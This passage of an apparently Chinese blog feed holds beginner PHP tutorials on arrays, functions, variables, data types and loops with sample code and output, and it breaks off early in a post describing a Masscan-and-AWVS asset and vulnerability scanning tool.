array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt;&apos;渗透测试&apos;);</span><br><span class="line">$array[&apos;and&apos;] = &apos;编程&apos;;</span><br><span class="line">print_r($array);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt;&apos;渗透测试&apos;);</span><br><span class="line">print_r($array[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;纸条&apos;,&apos;Python&apos;,&apos;PHP&apos;,&apos;渗透测试&apos;);</span><br><span class="line"></span><br><span class="line">for ($i=0; $i &lt; count($array); $i++) &#123; </span><br><span class="line">    echo $array[$i].&apos;&lt;hr /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="关联迭代"><a href="#关联迭代" class="headerlink" title="关联迭代"></a>关联迭代</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt;&apos;渗透测试&apos;);</span><br><span class="line">foreach ($array as $key =&gt; $value) &#123;</span><br><span class="line">    echo $array[$key].&apos;&lt;hr /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt;&apos;渗透测试&apos;);</span><br><span class="line">foreach ($array as $key =&gt; $value) &#123;</span><br><span class="line">    echo &apos;键名：&apos;.$key .&apos; 值：&apos;.$value .&apos;&lt;hr /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt;&apos;渗透测试&apos;);</span><br><span class="line">///这里只单独迭代$key 或者$value 都可以，两种方式迭代的值都是$value</span><br><span class="line">foreach ($array as $value) &#123;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出键：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt;&apos;渗透测试&apos;);</span><br><span class="line">///这里只单独迭代$key 或者$value 都可以，两种方式迭代的值都是$value</span><br><span class="line">foreach ($array as $key =&gt; $value) &#123;</span><br><span class="line">    echo $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="each"><a href="#each" class="headerlink" title="each"></a>each</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt;&apos;渗透测试&apos;);</span><br><span class="line">///只走到第一个键位</span><br><span class="line">var_dump(each($array)); </span><br><span class="line">///走到第二个键位</span><br><span class="line">var_dump(each($array)); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">list($name,$like,$test,$occupation) = array(&apos;纸条&apos;,&apos;Python&apos;,&apos;PHP&apos;,&apos;渗透测试&apos;);</span><br><span class="line">echo $name;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;name&apos;=&gt;&apos;纸条&apos;,&apos;like&apos;=&gt;&apos;Python&apos;,&apos;test&apos;=&gt;&apos;PHP&apos;,&apos;occupation&apos;=&gt; array(&apos;teo&apos;,&apos;二维数组&apos;));</span><br><span class="line">foreach ($array as $key =&gt; $value) &#123;</span><br><span class="line">    ///判断是否是二位数组</span><br><span class="line">    if (is_array($value)) &#123;</span><br><span class="line">        ///是二维数组再次迭代</span><br><span class="line">        foreach ($value as $key =&gt; $value) &#123;</span><br><span class="line">            echo &apos;二维数组：&apos;.$value.&apos;&lt;br/&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    ///否则直接输出</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;一维数组：&apos;.$value.&apos;&lt;br/&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一维数组：纸条</span><br><span class="line">一维数组：Python</span><br><span class="line">一维数组：PHP</span><br><span class="line">二维数组：teo</span><br><span class="line">二维数组：二维数组</span><br></pre></td></tr></table></figure><h3 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">== 要求数组长度一致，数组元素的值相等，下标也要相等</span><br><span class="line">=== 数组长度一致，值和类型完全一致，出现的顺序必须相同</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array1 = array(1,2,3);</span><br><span class="line">$array2 = array(3,2,1);</span><br><span class="line">$array3 = array(&apos;1&apos;,&apos;2&apos;,&apos;3&apos;);</span><br><span class="line"></span><br><span class="line">var_dump($array1 == $array2);</span><br><span class="line">var_dump($array1 === $array3);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(false) </span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 函数</title>
      <link href="/article/php-function.html"/>
      <url>/article/php-function.html</url>
      
        <content type="html"><![CDATA[<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function webing($value=&apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">webing();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">///形参</span><br><span class="line">function webing($name,$age,$addres)</span><br><span class="line">&#123;</span><br><span class="line">    echo $name,$age,$addres;</span><br><span class="line">&#125;</span><br><span class="line">///实参</span><br><span class="line">webing(&apos;名字&apos;,&apos;年龄&apos;,&apos;地址&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function webing()</span><br><span class="line">&#123;</span><br><span class="line">    $webing = 0;</span><br><span class="line">    $webing ++;</span><br><span class="line">    echo $webing;</span><br><span class="line">&#125;</span><br><span class="line">webing();</span><br><span class="line">webing();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function webing()</span><br><span class="line">&#123;</span><br><span class="line">    ///静态变量</span><br><span class="line">    static $webing = 0;</span><br><span class="line">    $webing ++;</span><br><span class="line">    echo $webing;</span><br><span class="line">&#125;</span><br><span class="line">webing();</span><br><span class="line">webing();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><h3 id="局外变量、局部变量"><a href="#局外变量、局部变量" class="headerlink" title="局外变量、局部变量"></a>局外变量、局部变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$io = &apos;全局变量&apos;;</span><br><span class="line"></span><br><span class="line">function webing()</span><br><span class="line">&#123;</span><br><span class="line">    ///局部变量</span><br><span class="line">    static $webing = 0;</span><br><span class="line">    $webing ++;</span><br><span class="line">    echo $webing;</span><br><span class="line">    ///不能引用局外变量，需要加上global跟Python类似</span><br><span class="line">    global $io;</span><br><span class="line">    echo $io;</span><br><span class="line">&#125;</span><br><span class="line">webing();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$io = &apos;外部变量&apos;;</span><br><span class="line"></span><br><span class="line">function webing()</span><br><span class="line">&#123;</span><br><span class="line">    echo $GLOBALS[&apos;io&apos;] = &apos;修改外部变量&apos;;</span><br><span class="line">&#125;</span><br><span class="line">webing();</span><br><span class="line">echo $io;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function webing()</span><br><span class="line">&#123;</span><br><span class="line">    return &apos;return返回结果&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$io = webing();</span><br><span class="line">echo $io;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">///&amp;$name=&apos;&apos; 引用age的函数</span><br><span class="line">function webing(&amp;$name=&apos;&apos;,$age=Null)</span><br><span class="line">&#123;</span><br><span class="line">    $name = &apos;函数里边的名字&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$age = 2018;</span><br><span class="line">webing($age);</span><br><span class="line">echo $age;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 数据类型、对象、常量、循环</title>
      <link href="/article/php-data-type.html"/>
      <url>/article/php-data-type.html</url>
      
        <content type="html"><![CDATA[<p>字符串函数：<a href="http://www.w3school.com.cn/php/php_ref_string.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_ref_string.asp</a></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符串: &apos;webing&apos;、&quot;webing&quot;</span><br><span class="line">整型: 2018</span><br><span class="line">浮点型: 2018.09</span><br><span class="line">逻辑: False True</span><br></pre></td></tr></table></figure><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class webing</span><br><span class="line">&#123;</span><br><span class="line">    function _construct($webing)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $webing;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$io = new webing(webing.io);</span><br><span class="line">///查看变量类型</span><br><span class="line">var_dump($io)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$webing = &apos;webing.io&apos;;</span><br><span class="line">///双引号输出变量的值，单引号直接输出变量名</span><br><span class="line">$io = &quot;&lt;p&gt;www&lt;/p&gt; &lt;p&gt;$webing&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo $io;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>如需设置常量，请使用 define() 函数 - 它使用三个参数：<br>首个参数定义常量的名称<br>第二个参数定义常量的值<br>可选的第三个参数规定常量名是否对大小写不敏感。默认是 false。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&apos;webing&apos;, &apos;io&apos;);</span><br><span class="line">echo webing;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>在 PHP 中，我们可以使用以下条件语句：<br>if 语句 - 如果指定条件为真，则执行代码<br>if…else 语句 - 如果条件为 true，则执行代码；如果条件为 false，则执行另一端代码<br>if…elseif….else 语句 - 选择若干段代码块之一来执行<br>switch 语句 - 语句多个代码块之一来执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (True) &#123;</span><br><span class="line">    echo &quot;if&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;else&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">switch (1) &#123;</span><br><span class="line">    ///判断值是否是1</span><br><span class="line">    case 1:</span><br><span class="line">        echo &quot;1&quot;;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case 2:</span><br><span class="line">        echo &quot;2&quot;;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case 3:</span><br><span class="line">        echo &quot;3&quot;;</span><br><span class="line">        break;</span><br><span class="line">    </span><br><span class="line">    default:</span><br><span class="line">        ///如果都不符合，执行这一句</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">switch (1) &#123;</span><br><span class="line">    ///判断值是否是1</span><br><span class="line">    case 1:</span><br><span class="line">        echo &quot;1&quot;;</span><br><span class="line"></span><br><span class="line">    case 2:</span><br><span class="line">        echo &quot;2&quot;;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case 3:</span><br><span class="line">        echo &quot;3&quot;;</span><br><span class="line">        break;</span><br><span class="line">    </span><br><span class="line">    default:</span><br><span class="line">        ///如果都不符合，执行这一句</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>continue  跳出本次循环<br>break     跳出整个循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$webing = 1;</span><br><span class="line">while ($webing &lt;= 10) &#123;</span><br><span class="line">    echo &quot;循环打印&quot;;</span><br><span class="line">    $webing ++;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">///定义一个变量i，判断i是否小于等于10，然后输出echo，输出后i++</span><br><span class="line">for ($i=0; $i &lt;= 10 ; $i++) &#123; </span><br><span class="line">    echo $i.&apos;&lt;br /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 变量</title>
      <link href="/article/php-variable.html"/>
      <url>/article/php-variable.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、定义变量"><a href="#1、定义变量" class="headerlink" title="1、定义变量"></a>1、定义变量</h3><p>变量以 $ 符号开头，其后是变量的名称。</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">///定义一个变量</span><br><span class="line">$webing = &apos;webing.io&apos;;</span><br><span class="line">///输出</span><br><span class="line">echo $webing;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webing.io</span><br></pre></td></tr></table></figure><h3 id="2、引用变量"><a href="#2、引用变量" class="headerlink" title="2、引用变量"></a>2、引用变量</h3><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$webing = &apos;webing.io&apos;;</span><br><span class="line"></span><br><span class="line">$webing = &amp;$io;</span><br><span class="line">$io = &apos;www&apos;;</span><br><span class="line"></span><br><span class="line">echo $webing;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$webing = &apos;webing.io&apos;;</span><br><span class="line">$io = &apos;www&apos;;</span><br><span class="line"></span><br><span class="line">$webing = &amp;$io;</span><br><span class="line"></span><br><span class="line">$io = &apos;com&apos;;</span><br><span class="line"></span><br><span class="line">echo $webing;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 自动化漏洞扫描器</title>
      <link href="/article/tool-scan-port-web.html"/>
      <url>/article/tool-scan-port-web.html</url>
      
        <content type="html"><![CDATA[<h3 id="关于端口扫描"><a href="#关于端口扫描" class="headerlink" title="关于端口扫描"></a>关于端口扫描</h3><ul><li><input disabled type="checkbox"> Nmap 使用Python调用Nmap进行端口扫描占用内存极大、速度很慢，特别是公网环境，压根就扫不动。</li><li><input disabled type="checkbox"> Scoket 使用Socket的方式来判断端口是否是开启状态，但是占用CPU极大。</li><li><input checked disabled type="checkbox"> Telnet 使用Telnet的方式来判断端口是否是开启状态，目前测试中，这种方式比较节省资源。</li><li><input disabled type="checkbox"> Masscan 发包速率大，扫描的结果不是很准确。</li></ul><h3 id="第一款扫描器"><a href="#第一款扫描器" class="headerlink" title="第一款扫描器"></a>第一款扫描器</h3><p>鸡肋但还是可以的，采用Masscan对端口进行探测，再根据端口进行web探测，再把web链接扔到awvs进行扫描。</p><h4 id="0×00-介绍"><a href="#0×00-介绍" class="headerlink" title="0×00 介绍"></a>0×00 介绍</h4><ul><li>在苦逼的乙方，成百上千个网段，动不动就是弱口令、命令执行, 这一切都是管理员反馈的资产不完整等其他原因造成的。当然，检查不到位就是乙方的锅，跑都跑不掉。</li><li>该工具就是为了弥补资产不完整而诞生：采用masscan对端口进行探测，再根据端口进行web探测，再把web链接扔到awvs进行扫描。</li><li>当然，由于masscan的特性及电脑网络的原因，扫描的并不是很完整，原本打算采用nmap来探测端口，但是速度很慢。</li></ul><h4 id="0×01-使用说明"><a href="#0×01-使用说明" class="headerlink" title="0×01 使用说明"></a>0×01 使用说明</h4><p>解压之后有以下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 